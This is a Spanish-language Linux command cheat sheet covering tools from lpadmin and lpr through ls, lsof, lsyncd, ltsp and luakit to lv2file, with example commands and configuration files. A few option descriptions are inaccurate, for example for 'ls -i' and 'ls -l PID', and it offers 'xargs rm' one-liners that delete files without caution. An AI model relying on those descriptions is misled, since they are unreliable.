# lpadmin -p HP_LaserJet_1018 -E -v usb://HP/LaserJet%201018 -P /usr/share/ppd/HP/HP-LaserJet_1018.ppd.gz (-E habilita la impresora y -P ruta al archivo PPD)
# lpadmin -x nombre_local (eliminar una impresora)
Opciones: -L --> añadir una ubicación [-L "oficina"] y -D --> añadir descripción [-D "impresora compartica"].


lpctools
Herramientas diseñadas para interactuar con los microcontroladores LPC de NXP, específicamente para la programación en sistema [In-System Programming - ISP] a través de una interfaz serie,  usualmente UART. Incluye los programas lpcisp y lpcprog
$ lpcisp -erase /dev/ttyUSB0 9600 (borrar el flash de un microcontrolador conectado al puerto serie /dev/ttyUSB0 y la velocidad de baudios para ISP es 9600)
$ lpcisp -hex mi_firmware.hex /dev/ttyUSB0 9600 (programar un archivo HEX en el microcontrolador)
$ lpcisp -bin mi_firmware.bin -verify /dev/ttyUSB0 9600 (programar un archivo BIN y verificarlo)
$ lpcisp -read 0x0 4096 backup_firmware.bin /dev/ttyUSB0 9600 (leer 4KB [4096 bytes] de la memoria flash desde la dirección 0x0 y guardarlo en un archivo)
$ lpcisp -reset /dev/ttyUSB0 9600 (reiniciar el microcontrolador después de la programación)
$ lpcprog -c LPC1768 -b 115200 -e -p mi_firmware.hex /dev/ttyUSB0 (chip LPC, velocidad en baudios, borrar y programar un archivo HEX para un LPC1768)
$ lpcprog -c LPC1343 -b 57600 -p mi_otro_firmware.bin -v -j /dev/ttyACM0 (programar un archivo BIN, verificar y luego ejecutar el firmware para un LPC1343)
$ lpcprog -c LPC1114 -b 38400 -r backup_lpc1114.bin /dev/ttyUSB1 (leer el firmware actual de un LPC1114 y guardarlo)
$ lpcprog -c auto -b 115200 /dev/ttyUSB0 (obtener información del dispositivo)


lpe
[Lightweight Programmer's Editor]. Editor ligero para programadores.
$ lpe --mode sh script.sh (entra en la interfaz del editor)


lpinfo
Lista los dispositivos o controladores disponibles conocidos por el servidor CUPS. Comandos relacionados: lpstat, cupsreject, cupsenable, cupsaccept, cupsdisable y lpadmin.
$ lpinfo -m (lista los drivers)
$ lpinfo -v (lista los dispositivos)


lpoptions
Información sobre las impresoras en cups
$ lpoptions -d psc-1100-series (Establecer la impresora predeterminada)
$ lpoptions -p psc-1100-series -l (Ver las opciones de la impresora predeterminada)


lpr
Utilidad de impresión en sistemas Unix y Linux que se utiliza para enviar archivos a la cola de impresión para imprimir tanto en impresoras locales como remotas. Incluye las herramientas lpq, lprm, lptest, lpc, lpd, lpf [en la actualidad, tiene poca o ninguna utilidad] y pac.
$ lpr archivo.txt (imprimir un archivo de texto)
$ lpr -P impresora_oficina archivo.txt (imprimir un archivo en una impresora específica)
$ lpr -# 3 archivo.txt (imprimir 3 copias de un archivo)
$ lpr -r archivo.txt (imprimir un archivo y eliminarlo después)
$ lpr -o landscape -o media=A4 archivo.pdf (imprimir un archivo en orientación horizontal y el tamaño del papel a A4)
$ lpq (ver cola de impresión)
$ lprm trabajo (eliminar un trabajo de la cola de impresión)
$ lpd (demonio de impresión)
$ lpstat -a (Muestra el estado de aceptación de las colas de impresión)
$ lptest (patrón tradicional de "prueba de ondulación" en la salida estándar)


lprint
Utilidad diseñada para la administración y operación de impresoras específicas de etiquetas y recibos, conectadas por red o USB. Es especialmente útil para impresoras que no funcionan correctamente con el subsistema estándar CUPS o que requieren compatibilidad para etiquetas y recibos, como Zebra, Brother, y otras marcas especializadas.
$ lprint submit -d zebra -n 3 etiqueta.png (imprimir 3 copias de una etiqueta desde un archivo PNG en la impresora llamada "zebra")
$ lprint submit -d zebra -o media=na_index-4x6_4x6in etiqueta.png (especificar el tamaño de la etiqueta)
$ lprint default -d zebra (e stablecer la impresora predeterminada)
$ lprint add -d zebra -v usb://URI_DEL_DISPOSITIVO -m DRIVER (agregar una impresora. Requiere saber el URI del dispositivo y el driver)
$ lprint devices (listar dispositivos USB detectados)
$ lprint list (lista las impresoras configuradas)
$ lprint status -d zebra (muestra el estado de la impresora)
$ lprint delete -d zebra  (elimina la impresora "zebra")


lprng
[Line Printer Remote Next Generation]. Sistema de cola de impresión lpr/lpd. El software LPRng es una versión mejorada, extendida y portátil del software LPR de Berkeley, el sistema de cola de impresión estándar de UNIX que puede utilizarse para impresoras locales y remotas. Ver lpr.


lpstat
Comprobar el estado de la impresora [ver lp].
$ lpstat -t


lptools
Herramientas que permiten trabajar con Launchpad [plataforma de desarrollo colaborativo de Ubuntu] sin necesidad de usar la interfaz web. Este paquete proporciona las siguientes herramientas: lp-attach, lp-bug-dupe-properties, lp-capture-bug-counts, lp-check-membership, lp-force-branch-mirror, lp-get-branches, lp-grab-attachments, lp-list-bugs, lp-milestone2ical, lp-milestones, lp-project, lp-project-upload, lp-recipe-status, lp-remove-team-members, lp-set-dup y lp-shell.
$ lp-list-bugs ubuntu (lista bugs de un proyecto en Launchpad)
$ lp-list-bugs --status "New" ubuntu (bugs con estado "New")
$ lp-list-bugs --tag "security" python (bugs con etiqueta "security")
$ lp-list-bugs --importance "Critical" ubuntu (listar bugs críticos de Ubuntu)
$ lp-bug-dupe-properties 123456  # Donde 123456 es el ID del bug (muestra información sobre bugs marcados como duplicados)
$ lp-attach 123456 archivo.txt (adjunta un archivo a un bug en Launchpad)
$ lp-project ubuntu (muestra información sobre un proyecto en Launchpad)
$ lp-get-branches lp:ubuntu (lista ramas [branches] asociadas a un proyecto)
$ lp-check-membership usuario ubuntu-dev (verifica si un usuario pertenece a un equipo en Launchpad)
$ lp-milestones ubuntu (lista los hitos [milestones] de un proyecto)
$ lp-shell (abre una consola interactiva para ejecutar múltiples comandos de lptools)
$ lp-grab-attachments 123456 --dest-dir=~/descargas/bug_123456 (descarga archivos adjuntos de un bug y los guarda en el archivo especificado)
$ lp-set-dup 123456 654321 (marca el bug 123456 como duplicado de 654321)
Nota.- Precisa cuenta en Launchpad y configurar credenciales en ~/.launchpadlib/creds.


lr
Herramienta para generar listados de archivos tipo ls.
$ lr -1 (solo directorios incluso los ocultos)
$ lr -l1Aon | column (sin los ocultos y ordenados por nombre)


lrzip
[Long Range ZIP]. Programa de compresión con una tasa muy alta, útil cuando se necesita una compresión muy eficiente para archivos grandes, como bases de datos, imágenes de disco, o archivos de respaldo.
$ lrzip -k archivo (generará un archivo comprimido llamado archivo.lrz y mantendrá el archivo original)
$ lrunzip archivo.lrz (descomprimir)
$ lrzip -d archivo.lrz (descomprimir)
$ lrzip -9 archivo.txt (comprimir con un nivel de compresión máximo. El rango va de 1 a 9)
$ lrzip --method=lzma archivo.txt (usar el algoritmo LZMA para la compresión)
$ lrzip -I archivo.lrz (mostrar información sobre un archivo comprimido)
$ lrzcat archivo.lrz (descomprimir)


ls
Listar archivos de un directorio.
$ ls -i (Muestra todos los archivos no ocultos)
$ ls -a (Muestra todos los archivos, incluso los ocultos)
$ ls -l (Muestra permisos, último acceso i propietarios)
$ ls -1 (muestra en un listado)
$ ls -F (Muestra a continuación de cada elemento si se trata de un directorio [/], un ejecutable [*] o un enlace [@])
$ ls -F | grep '/$' (Lista solo directorios)
$ ls -F | grep -v '/$' (Lista solo los archivos)
$ ls -L (En los enlaces, se muestra el archivo al que apuntan)
$ ls -l PID (Muestra qué está corriendo con el PID especificado)
$ ls -R	(recursivamente)
$ ls -Z (listar visualizando los contextos en selinux [ver])
$ ls -s	(Muestra el tamaño)
$ ls -S (Lista por tamaño)
$ ls ../ (Listar los archivos del directorio anterior)
$ ls -t	(lista por fecha de modificación de más nuevo a más viejo)
$ ls /boot /usr (Lista los dos directorios especificados)
$ ls -ad *.sh (lista los terminados en .sh)
$ ls *.{odt,txt} (Lista los de las extensiones mencionadas)
$ ls -ad */ (Lista sólo los directorios)
$ ls -alL /home/usuario/videos
$ ls -l /lib/modules (muestra los kernels instalados)
$ ls | xargs rm (Eliminar todos los archivos)
$ ls @(*.sh|*.txt) (Sólo mostrará las extensiones especificadas. Precisa activación de los comodines extendidos de bash con: shopt -s extglob)
$ ls !(*.sh|*.txt) | xargs rm (Elimina todos menos los mencionados)


lsat
Herramienta de auditoria de seguridad. Emplea mucho tiempo y crea un fichero de varias megas (lsat.out)
$ lsat


lsattr
Muestra los atributos de los ficheros [no los permisos]. (ver chattr)
$ lsattr -R /home/usuario   (recursivamente)
$ lsattr -a /home/usuario   (incluye a todos los archivos de los directorios)
Un ejemplo completo:
	$ touch archivo.txt (crear el fichero)
	$ lsattr archivo.txt (ver los atributos)
	--------------e---- archivo.txt (resultado)
	# chattr +i -A archivo.txt (Agregar el atributo inmutable y que no se modifique el atime)
	$ lsattr archivo.txt (ver los nuevos atributos)
	----i--A------e---- archivo.txt


lsblk
Muestra información de los dispositivo montados.
$ lsblk (los muestra todos)
$ lsblk -a /dev/sda
$ lsblk -f /dev/sda (Mostrando etiquetas, uuids y puntos de montaje)
$ lsblk -m /dev/sda (Mostrando propietarios, grupos y permisos)


lsb-release
Herramienta sencilla que ayuda a identificar la distribución de Linux utilizada y su conformidad con la Base Estándar de Linux.
$ lsb_release -a (muestra la versión del sistema operativo)
$ lsb_release -r (solo mosrará el número de versión)
S lsb_release -d (descripción de la distribución)
$ lsb_release -c (solo el codename de la distribución)


lscolors
Colorear rutas con la variable de entorno LS_COLORS. Es una herramienta mínima y probablemente solo tenga un uso interno o experimental ya que la donfiguración de colores se hace con el comando dircolors [ver].
$ lscolors /usr/share/libreoffice/bin/lo-xlate-lang (colorear una ruta)
$ lscolors /etc/passwd /usr/bin/bash /var/log/syslog (colorear varias rutas)


lscpu
Muestra información sobre la cpu
Algunos conceptos útiles:
$ lscpu (muestra modelo, núcleos, hilos, frecuencia base y máxima...)
        ...
        Architecture:            x86_64
        ...
        CPU(s):                  6
        ...
        CPU(s) scaling MHz:      28%
        CPU max MHz:             4000,0000
        CPU min MHz:             800,0000
Architecture --> la arquitectura del pc
CPU(s) --> número de CPUs del pc
CPU(s) scaling MHz --> frecuencia actual en ese instante.
CPU max MHz --> turbo máximo que soporta.
CPU min MHz --> frecuencia mínima posible.


lsd
listar directorios. Un comando ls con más colorido.
$ lsd -a (mostrar todo incluso los archivos y directorios ocultos)
$ lsd -l -R (mostrar los archivos, directorios y subdirectorios con sus atributos)
$ lsd --tree (en forma de arbol)
$ lsd -d --tree (solo mostrar los directorios y en forma de arbol)
$ lsd --classic (mostrar parecido a ls)


lsdev
[procinfo]. Lista los dispositivos presentes en el sistema y que IRQs y puertos IO (entrada/salida) usan.
$ lsdev


lsdvd
Aplicación para leer el contenido de un DVD e imprimirlo en la terminal. Con un dvd conectado en /dev/dvd:
$ lsdvd -a (información sobre los flujos de audio)
$ lsdvd -x (volcar toda la información)


lsfd
[util-linux-extra]. Lista de descriptores de archivos. Está pensado para ser un reemplazo de lsof pero centrado en el núcleo de Linux
# lsfd --summary=only (informa de los números de descriptores de sockets netlink y descriptores de sockets unix)
# lsfd --pid "$(pidof firefox)" (listar los archivos descriptores asociados con "firefox")
# lsfd -Q 'DELETED' (lista de archivos descriptores eliminados asociados a procesos)
# lsfd -Q 'TYPE != "REG"' (lista de archivos descriptores no regulares)


lsh
[lsh-client lsh-server lsh-utils]. Implementación con licencia GPL del protocolo Secure Shell versión 2 [SSH2] que proporcionar acceso remoto seguro, transferencia de archivos y gestión de sesiones seguras entre sistemas.
$ lsh-client user@servidor.example.com (iniciar una sesión interactiva en un servidor remoto)
$ lsh-client -p 2222 user@servidor.example.com (especificar un puerto no estándar, el 22)
$ lsh-clien user@servidor.example.com "ls -la" (ejecutar un comando en el servidor sin iniciar una sesión interactiva)
$ lsh-keygen (genera un par de claves: pública y privada)
$ lsh-writekey (instala las claves en el directorio `~/.lsh/` y configura los permisos adecuados)
Nota.- lsh es menos común que OpenSSH, por lo que el soporte y la documentación son más limitados.


lshal
Mostrar elementos en la base de datos del dispositivo HAL [Hardware Abstraction Layer]. Muestra información del firmware, serial server, Bios, kernel, procesador, discos, puntos de montaje, particiones, usb, pci... HAL está en desuso en la mayoría de las distribuciones Linux. La funcionalidad se está fusionando en udev.
$ lshal  (Información de los dispositivos de HAL en formato largo y detallado))
$ lshal -l (Lo mismo que el anterior)
$ lshal -s (Muestra el UDI [Dispositivo identificador único])
$ lshal -st (Lo mismo pero en forma de arbol)
$ lshal -m (Monitor de los dispositivos de HAL mostrando cambios de estado en tiempo real al conectar un dispositivo)
$ lshal -u UDI (Muestra información de un dispositivo específico)
# lshal -t (visualizar los dispositivos organizados en árbol)


lshell
shell restrictiva para permitir a usuarios acceder via ssh al sistema limitando sus privilegios. Algunas modificaciones en el archivo de configuración:
# nano /etc/lshell.conf
	...
	[global]
	# archivo de logs
	logpath         : /var/log/lshell/
	...
	[default]
	...
	# Comandos permitidos
	allowed         : ['ls','echo','cd','ll','cat','more','nano']
	# Mensaje al arrancar
	intro           : "*** Entrando en la máquina con privilegios limitados *** Pulsar '?' o 'help' para listar comandos autoritzados"
	# Si el usuario tiene una carpeta personal
	home_path       : '/home/USUARIO/'


lshw
Muestra información de toda la máquina
$ lshw -html > hardware.html (Mandar la información a un archivo html)
# lshw -C network (Ver los dispositivos de red instalados)


lsipc
Muestra información sobre las facilidades de comunicación entre procesos para las cuales el proceso de llamada tiene acceso de lectura.
$ lsipc -g -b (mostrar información sobre todos los recursos y mostrarlos en bytes)
$ lsipc -l


lsirq
[utils-linux-extra]. Utilidad que muestra información de interrupcines del kernel.
# lsirq -P (resultados en forma de pares clave="valor")
# lsirq -S (muestra información de softirqs [controladores de interrupciones de software])


lslogins
Mostrar información sobre usuarios conocidos en el sistema.
$ lslogins -g USER user (Información del grupo "user")
$ lslogins -l (listado)


lsm
[Link Status Monitor]. Herramienta diseñada para supervisar la conectividad de un router o firewall. Su función principal es monitorear si las distintas interfaces de red están activas o caídas. Puede ejecutar scripts externos en caso de que detecte la caída de una conexión, permitiendo así cambiar el enrutamiento, enviar alertas o realizar acciones correctivas automáticas.
$ lsm -d eth0,eth1 -s failover.sh (monitorización básica de enlaces y script externo que se ejecutará cuando una interfaz cambie de estado)
Un ejemplo de script externo [Enviar una alerta y cambiar rutas]:
$ nano  failover.sh
        #!/bin/bash
        logger "Se ha detectado un cambio en el estado de la interfaz de red"
        ip route replace default via 192.168.2.1 dev eth1


lsmbox
lista el número de mensajes totales y no leídos en uno o varios archivos de buzones y también permite la monitorización continua de los buzones.
$ lsmbox /path/to/mailbox (mostrará el número total de mensajes y el número de mensajes no leídos en el buzón especificado)
$ lsmbox /path/to/mailbox1 /path/to/mailbox2 (listar el número de mensajes en varios buzones)
$ lsmbox -w /path/to/mailbox (monitorización continua de un buzón)
$ lsmbox -u /path/to/mailbox (mostrar solo el número de mensajes no leídos en el buzón especificado)
$ lsmbox -f "Total: %t, No leídos: %u" /path/to/mailbox (formato personalizado para la salida. %t se reemplazará con el número total de mensajes y %u con el número de mensajes no leídos.)
$ lsmbox -w -i 10 /path/to/mailbox (monitorización continua con un intervalo específico de cada 10 segundos)


lsmod
Listar todos los módulos cargados del kernel, y alguna información adicional de ellos.
$ lsmod
$ cat /proc/modules (otra forma)


lsmount
Alinea y colorea la salida de /proc/mounts para que sea más cómoda de leer.
$ lsmount


lsns
lista información sobre todos los espacios de nombres actualmente accesibles o sobre el espacio de nombres dado.
$ lsns -t cgroup
$ lsns -t pid
$ lsns -l


lsof
Listar ficheros o procesos abiertos
# lsof -i :4662  (servicios usados por el puerto 4662 aunque esten a la escucha)
# lsof -X (Desactiva la identifiación de conexiones)
# lsof -i@lapipaplena.homelinux.com  (verificar conexiones con una máquina)
# lsof -i@88.25.114.11   (lo mismo pero especificando la ip)
# lsof -i | grep ssh  (Para que muestre solo los que usan el protocolo ssh)
# lsof +D /var/log  (Mostrar los servicios que tiene abierto un directorio)
# lsof fichero  (Muestra los servicios que tiene abiertos fichero)
# lsof -nPi TCP   (Muestra los eventos de red de las conexiones TCP)
# lsof -p PID  (Ficheros que tiene abierto determinado proceso)
# lsof -N      (Muestra los archivos NFS abiertos)
# lsof -c firefox   (Muestra los ficheros abiertos por firefox)
# lsof -P -i -n -sTCP:LISTEN (listado de puertos en LISTEN)
# lsof -i -P | grep -i "listen" (otra forma de listarlos)
# lsof -i tcp -i udp  (lista puertos tcp y udp abiertos)
# lsof -Pni | grep LISTEN   (chequear puertos abiertos)
# lsof -c bash -r  (Monitorizar un proceso)
# lsof -i :631 | awk '{print $1,$2}' | sort -u  (muestra pid y demonio del puerto especificado)
# lsof -t -i :22 (Muestra el pid del puerto especificado)
# lsof -nPi | txt2html  > lsof.html (Mandar la salida a un html para visualizarlo por el navegador)
Opciones:
	-P (Muestra los números de puerto en vez de la aplicación que corre en ellos)
	-n (Para que no resuelva las IP de las conexiones)
	-i (Hace referencia a los eventos utilizados por procesos de red)
	-u usuario (Muestra los procesos abiertos por “usuario”)
	-x (Sigue links y puntos de montaje)
1.-
Resolver salida:
	lsof: WARNING: can't stat() tracefs file system /sys/kernel/debug/tracing
Lanzar como root:
# umount $(mount | grep debugfs | awk '{print $3}')


lspci
Para averiguar todos los dispositivos pci
$ lspci | grep Ethernet  (listar dispositivos pci relacionados con la red)
$ lspci | grep VGA   (conocer la tarjeta gráfica)


lspcmci
Muestra los dispositivos pcmci.


lspgpot
Extraer los valores ownertrust de los llaveros PGP y los lista en formato GnuPG ownertrust.
# lspgpot


lspower
[powermgmt-base]. Enumera las fuentes de energía que el sistema conoce y su estado.
$ lspower (En un pc de escritorio mostrará: "Sin sensores de suministro de energía; eso es normal en una computadora de escritorio")


lsscsi
Muestra información de los discos duros y unidades de DVD o tarjetas que tengamos conectados al PC
$ lsscsi (Muestra un resumen de las unidades)
$ lsscsi -l (Muestra información extendida de las unidades)
$ lsscsi -L (Muestra información aún más extensa de las unidades, en varias líneas)
$ lsscsi -s (Mostrando la capacidad)


lsusb
Ver los puertos USB y los dispositivos conectados a ellos. De vez en cuando ha de actualizarse la lista de los dispositivos reconocidos por nuestro equipo con:
# update-usbids
$ lsusb -d 046d:c00e (De un dispositivo determinado especificando fabricante y producto)
$ lsusb -s 006:002 (De un dispositivo determinado especificando bus y número dispositivo)


lsyncd
[Live SYNCing Daemon]. Daemon que se utiliza con rsync para sincronizar directorios locales con una máquina remota. Observa los cambios en los directorios locales y luego lanza procesos de rsync para sincronizar esos cambios con un destino remoto o local en lugar de realizar escaneos programados.
$ rsync -avz --delete /var/www/html/ usuario@servidor-remoto.com:/var/www/html/
Nota.- Antes de iniciar lsyncd, a menudo es una buena idea realizar un rsync inicial completo manualmente del origen al destino. Esto asegura que el destino ya esté sincronizado, y lsyncd solo necesite manejar los cambios posteriores.
Archivo de Configuración de Ejemplo
# nano /etc/lsyncd/lsyncd.conf
        settings {
            logfile    = "/var/log/lsyncd/lsyncd.log",
            statusFile = "/var/log/lsyncd/lsyncd.status",
            maxProcesses = 2,
            delay      = 1,
        }
        sync {
            default.rsync,
            source    = "/var/www/html",
            target    = "usuario@servidor-remoto.com:/var/www/html",
            rsync     = {
                archive = true,
                compress = true,
                perms = true,
                owner = true,
                group = true,
                exclude = {
                    ".git/",
                    "cache/",
                    "tmp/*",
                },
                _extra = {"--delete"},
            },
        }
Explicación de la Configuración:
Bloque settings {}:
    logfile: Ruta al archivo de registro de lsyncd. Esencial para la depuración.
    statusFile: Ruta a un archivo donde lsyncd escribe su estado (por ejemplo, número de procesos rsync activos).
    maxProcesses: Limita el número de procesos rsync que pueden ejecutarse simultáneamente. Útil para evitar sobrecargas.
    delay: El tiempo que lsyncd espera después de un evento antes de iniciar un rsync. Esto ayuda a agrupar múltiples cambios rápidos en una sola transferencia.
Bloque sync {}:
    default.rsync: Especifica que esta sincronización utiliza el comportamiento predeterminado de rsync. lsyncd también soporta default.direct para copias de local a local sin rsync.
    source: El directorio local a monitorear.
    target: El destino remoto en formato usuario@host:ruta.
    rsync = {}: Esta tabla anidada te permite pasar opciones de rsync directamente.
        archive = true: Esto es una abreviatura de -a, que incluye -rlptgoD [recursivo, enlaces, permisos, tiempos, grupo, propietario, dispositivos].
        compress = true: Usa -z para compresión durante la transferencia.
        perms, owner, group: Banderas específicas de rsync para preservar los atributos de los archivos.
        exclude: Una tabla de patrones a excluir de la sincronización. Similar a rsync --exclude.
        _extra = {"--delete"}: Indica a rsync que elimine los archivos en el destino que ya no existen en el origen.
Después de crear o modificar el archivo de servicio para ssystemd:
# nano /etc/systemd/system/lsyncd.service
        [Unit]
        Description=Servicio de sincronización Lsyncd
        After=network.target
        [Service]
        Type=forking
        ExecStart=/usr/bin/lsyncd /etc/lsyncd/lsyncd.conf
        ExecReload=/bin/kill -HUP $MAINPID
        PIDFile=/var/run/lsyncd.pid
        Restart=on-failure
        [Install]
        WantedBy=multi-user.target
Se podrán usar las clásicas opciones de  systemctl
# systemctl daemon-reload (releer la configuración)
# systemctl enable lsyncd.service (activar servicio al inicio)
# systemctl status lsyncd.service (ver el estado del servicio)


ltsp
[Linux Terminal Server Project]. Facilita el arranque en red de clientes LAN desde una única instalación ubicada en un entorno chroot o una máquina virtual en el servidor LTSP. LTSP integra dnsmasq para proporcionar DHCP, para asignar IP y decir a los clientes dónde está la imagen y TFTP para enviar el kernel/initramfs al cliente.
# ltsp image / (crear la imagen del sistema para clientes usando la propia máquina como base. Creará un archivo parecido a /srv/ltsp/images/amd64.img)
Archivo básico dnsmasq
# nano /etc/dnsmasq.d/ltsp.conf
        port=0
        dhcp-range=192.168.67.20,192.168.67.250,12h
        dhcp-boot=ltsp/ltsp.ipxe
        pxe-service=X86PC, "Boot LTSP", ltsp/ltsp.ipxe
        enable-tftp
        tftp-root=/srv/tftp
# systemctl restart dnsmasq (recargar la configuración)
Añadir soporte NBD, opcional pero recomendado:
# apt install nbd-server
# nano /etc/nbd-server/config
        [ltsp]
            exportname = /srv/ltsp/images/amd64.img
            readonly = true
        ...
# systemctl restart nbd-server (recargar servicio)
$ qemu-system-x86_64 -enable-kvm -m 2G -netdev user,id=net0 -device e1000,netdev=net0 -boot n (arranca el cliente virtual [KVM/QEMU] por red. "-boot n" hace que arranque vía PXE)
# ltsp image / (actualizar imagen tras cambios en el servidor)
# adduser alumno1 (crear usuarios para clientes)
# journalctl -u nbd-server (ver logs de arranque)
# journalctl -u dnsmasq


lttng-tools
[lttng-modules-dkms]. Herramientas y módulos del kernel necesarios para permitir el rastreo avanzado con LTTng [Linux Trace Toolkit Next Generation]. DKMS [Dynamic Kernel Module Support] permite que estos módulos se recompilen automáticamente al actualizar el kernel, asegurando compatibilidad continua. Estos módulos, que no están disponibles en el kernel principal, hacen posible activar puntos de traza y observar eventos detallados como cambios de tarea, interrupciones, llamadas al sistema, bloqueos, etc., crucial para detectar problemas de rendimiento y debug multiplataforma y con muchos hilos concurrentes. Ver comando babeltrace
$ lsmod | grep lttng (comprobar que los módulos esten cargados)
# lttng list -k (listado de eventos disponibles en el kernel)
# lttng create mi-sesion (crear una sesión de rastreo)
# lttng enable-event -k sched_switch (habilitar eventos de kernel para rastreo)
# lttng start (comenzar el rastreo)
# lttng stop (detener el rastreo)
# lttng destroy


ltunify
Empareja y administra dispositivos Logitech que usan el receptor unificador.
$ ltunify -D list (mostrar todos los dispositivos emparejados)
$ ltunify pair 100 keyboard (Intentar emparejar dentro de los segundos especificados. De 1 a 255, predeterminado 0 [30 s])
$ ltunify unpair numpad (desvincular dispositivo)
$ ltunify receiver-info (mostrar información sobre el receptor)
$ ltunify info idx (información de un dispositivo. "idx" se refiere al número de dispositivo que se muestra en la primera columna del comando list)
$ ltunify info mouse ("idx" puede sustituirse por keyboard, mouse, numpad, presenter, trackball y touchpad, sin importar mayúsculas o minúsculas)


luakit
Navegador web
$ luakit
$ torify luakit (si queremos invisibilidad))
En antiguas versiones la configuración era:
Copiar los archivos de configuración:
	$ cp -r /etc/xdg/luakit .config/
El archivo de configuración de los parámetros generales (página de inicio, motor de busqueda, …):
	$ nano .config/luakit/globals.lua
Pero a partir de la versión del mayo de 2018 solo se precisa el archivo:
	$ nano  .config/luakit/userconf.lua
con el siguiente contenido como ejemplo:
    -- Settings (the commented ones do not [yet] work)
    local settings = require "settings"
    settings.window.home_page                             = "https://lapipaplena.wordpress.com"
    settings.window.scroll_step                           = 60
    settings.window.zoom_step                             = 0.2
    settings.window.new_window_size                       = "1200x600"
    settings.window.load_etc_hosts                        = false
    -- settings.vertical_tabs.sidebar_width                  = 200
    settings.webview.zoom_level                           = 120
    settings.webview.zoom_text_only                       = true
    settings.webview.enable_webgl                         = true
    settings.on["youtube.com"].webview.enable_javascript  = true
    settings.on["youtube.com"].webview.enable_plugins     = true
    settings.window.search_engines.archwiki               = "https://wiki.archlinux.org/?search=%s"
    settings.window.search_engines.aur                    = "https://aur.archlinux.org/packages.php?O=0&K=%s&do_Search=Go"
    settings.window.search_engines.duckduckgo             = "https://duckduckgo.com/?q=%s"
    settings.window.search_engines.github                 = "https://github.com/search?q=%s"
    settings.window.search_engines.google                 = "https://google.com/search?q=%s"
    settings.window.search_engines.imdb                   = "http://www.imdb.com/find?s=all&q=%s"
    settings.window.search_engines.ncbi                   = "https://www.ncbi.nlm.nih.gov/gquery/?term=%s"
Atajos de teclado en:
	$ nano .config/luakit/binds.lua
Algunos de los mismos son:
Desplazamiento y visialización:
	j (bajar por la página)
	k (Subir)
	h (Hacia la izquierda)
	l (Hacia la derecha)
	Page_Up (Ir al principio de la página)
	Page_Down (Ir a final de la página del todo)
	^d (Desplazamiento rápido hacia el final de la página)
	^u (Desplazamiento rápito hacia el principio de la página)
	+ (Aumentar medida de la fuente)
	- (Disminuir la medida de la fuente)
	= (Restablecer los parámetros por defecto)
	F11 (Pantalla complet)
Abrir/ cerrar páginas y pestañas
	o (Abrir url [:open....])
	O (Edita la barra de direcciones para modificar la url)
	t (Abrir url en una nueva pestaña [:tabopen....])
	^t (Abrir nueva pestaña con la página de inicio)
	T (Edita la barra de direcciones y la abre en una nueva pestaña)
	d (Cierra la pestaña activa)
	D (Cierra la ventana activa)
	u (reabre la última pestaña cerrada)
	w (Nueva ventana)
Moverse por la página
	^o (página anterior)
	^i (página siguiente)
	gt (ir a la pestaña anterior)
	gT (ir a la pestaña siguiente)
	gh (ir a la página de inicio)
	b (Volver a la página anterior)
	:f (Ir a la página siguiente)
	f (Marca todos los enlaces con un número y si se teclea se entra en el enlace)
	F (Lo mismo pero en una nueva pestaña)
	r (Recargar la página)
	R (Recargar ignorando la caché)
Direcciones de interés
	B (Escribe la página actual en los enlaces de interés)
	gb (Abrir los enlaces de interés en la pestaña actual)
	gB (Lo mismo en una nueva pestaña)
	ZZ (Cerrar guardando las pestañas abiertas)
Descargas
	;s (Marcará todas las descargas con un número que si se tecla se procederá a descargar)
	gd (Abrir la página que muestra todas las descargas activas en la pestaña activa)
	gD (Lo mismo en una nueva pestaña)
Si una vez abierta la barra de navegación [con “o”, “t”..] colocamos:
	gg palabra (Buscará palabra en googl)
	ddg palabra (lo hará en el buscador duckduckgo)
	wp palabra (La buscará en la wikipedia)
	yu palabra (En youtube)


luit
Utilidad para traducir el conjunto de caracteres de un programa para que su salida se pueda mostrar correctamente en un emulador de terminal que usa un juego de caracteres diferente. El objetivo principal de luit es permitir que las aplicaciones "heredadas" que usan juegos de caracteres distintos de UTF-8 funcionen con emuladores de terminal contemporáneos.
$ LC_ALL=ja_JP luit (modifica la terminal a la codificación japonesa. Es preciso tener instalada la codificación)
$ luit -list | grep ISO885
$ luit -encoding 'ISO 8859-1' xterm


lumin
Resalta las coincidencias con un patrón específico (cadena o expresión regular) en los archivos, usando color. Es similar a grep con salida coloreada, pero muestra todas las líneas de los archivos dados, no solo las líneas coincidentes.
$ lumin palabra archivo.txt (muestra todo el archivo.txt con "palabra" coloreada en rojo por defecto)
$ lumin -c green palabra archivo.txt (cooreada en verde)
$ lumin -l (códigos de colores disponibles)
$ lumin -n (nombres de colores disponibles)


lunzip
Descompresor de archivos comprimidos con lzip [ver]


lur-command
Herramienta de control del receptor Logitech Unifying y los dispositivos conectados, lo que permite conectar varios dispositivos Logitech, como ratones y teclados, a un solo receptor USB.
$ lur-command --list (listar los dispositivos actualmente emparejados y conectados)
$ lur-command --disconnect 12345678-ABCD-EF01-2345-6789ABCDEF01 (desconectar el dispositivo con ese ID del receptor)
$ lur-command --pair (pondrá el receptor en modo de emparejamiento y cuando detecte el dispositivo, lo emparejará automáticamente)
$ lur-command --status (ver el estado del receptor y dispositivos)
$ lur-command --reset (reiniciar el receptor)


lv
[Less Viewer]. Visor de archivos similar a less que puede decodificar y codificar flujos multilingües mediante diversos sistemas de codificación: ISO-8859, ISO-2022, EUC, SJIS, Big5, HZ y Unicode.
$ lv archivo.txt (mostrará el archivo en pantalla paginada)
$ lv -I utf-8 archivo.txt (por defecto detecta la codificación automáticamente, pero se puede especificar)
$ lv -I euc-jp -O utf-8 archivo.jp (leerá el archivo como EUC-JP y lo mostrará en UTF-8)
$ lv -h (mostrar ayuda y las opciones de codificación soportadas)
$ lv -I sjis -O utf-8 archivo_sjis.txt (un archivo en japonés codificado en Shift-JIS y verlo como UTF-8)


lv2file
Programa para aplicar efectos LV2 a archivos de audio como WAV o FLAC. En esencia, actúa como un anfitrión que carga un plugin LV2 y procesa el audio de un archivo de entrada para crear un nuevo archivo de salida con los efectos aplicados. lv2file no incluye efectos integrados, por lo que se debe instalar otros paquetes que contengan plugins LV2 para usarlos.
$ lv2ls (lista todos los plugins LV2 instalados)
$ lv2ls | grep calf (buscar plugins de Calf)
$ lv2file -i voz.wav -o voz_con_reverb.wav http://calf.sourceforge.net/plugins/Reverb (aplica un reverb con los ajustes por defecto con el identificador del plugin a usar)
$ lv2file -i voz.wav -o voz_reverb_grande.wav http://calf.sourceforge.net/plugins/Reverb -p roomsize 0.8 (aplica un reverb y ajusta el tamaño de la sala [roomsize] a 0.8)
